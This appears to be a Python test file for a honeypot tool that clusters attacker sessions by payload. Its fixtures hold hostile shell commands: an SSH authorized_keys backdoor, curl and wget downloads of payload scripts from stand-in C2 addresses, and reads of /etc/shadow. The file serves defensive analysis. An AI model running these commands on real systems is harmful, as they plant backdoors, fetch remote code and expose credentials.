from __future__ import annotations

from datetime import datetime, timezone

from mirage.data.schema import Command

from bridge.enrich import _hash_cluster


class _FakeSession:
    """Minimal stand-in for mirage.data.schema.Session -- _hash_cluster only
    reads .commands."""

    def __init__(self, commands: list[Command]) -> None:
        self.commands = commands


def _cmd(raw: str, offset: int = 0) -> Command:
    return Command(timestamp=datetime.now(timezone.utc), raw=raw, ms_offset=offset)


def test_identical_payload_with_different_c2_ip_clusters_together() -> None:
    backdoor = 'rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA... mdrfckr" >> .ssh/authorized_keys'
    session_a = _FakeSession([_cmd(backdoor), _cmd("curl -o x http://203.0.113.5/payload.sh", 100)])
    session_b = _FakeSession([_cmd(backdoor), _cmd("curl -o x http://198.51.100.9/payload.sh", 100)])

    cluster_a = _hash_cluster(session_a)
    cluster_b = _hash_cluster(session_b)

    assert cluster_a is not None
    assert cluster_a == cluster_b
    assert cluster_a.startswith("payload:")


def test_different_payloads_do_not_cluster_together() -> None:
    session_a = _FakeSession([_cmd("cat /etc/passwd"), _cmd("cat /etc/shadow", 100)])
    session_b = _FakeSession([_cmd("wget http://example.com/x.sh"), _cmd("chmod +x x.sh", 100)])

    assert _hash_cluster(session_a) != _hash_cluster(session_b)


def test_too_few_commands_returns_none() -> None:
    session = _FakeSession([_cmd("ls")])
    assert _hash_cluster(session) is None


def test_empty_session_returns_none() -> None:
    session = _FakeSession([])
    assert _hash_cluster(session) is None
